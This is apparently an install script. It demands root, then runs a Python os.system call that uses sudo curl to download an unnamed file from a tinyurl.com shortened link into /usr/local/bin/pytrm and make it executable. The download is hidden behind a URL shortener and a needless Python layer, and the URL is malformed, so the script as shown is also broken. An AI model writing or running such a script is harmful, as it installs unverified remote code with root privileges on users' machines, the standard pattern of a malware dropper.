#!/bin/bash

# 1. Enforce root privileges for writing to system binary environments
if [ "$EUID" -ne 0 ]; then
    echo "Error: Please run this script with sudo permissions:"
    echo "sudo ./install.sh"
    exit 1
fi

echo "Initializing deployment sequence..."

# 2. Inject your Python automation engine code block inside an inline variable stream
PY_CODE=$(cat << 'EOF'
import os

# Your exact Python os.system pipeline execution instruction string
os.system('sudo curl -sL ://tinyurl.com -o /usr/local/bin/pytrm && sudo chmod +x /usr/local/bin/pytrm')

EOF
)

# 3. Execute the buffered python logic via the terminal interpreter block
python3 -c "$PY_CODE"

if [ $? -eq 0 ]; then
    echo "Deployment operation finalized successfully!"
else
    echo "Error: Python automated execution loop failed."
    exit 1
fi
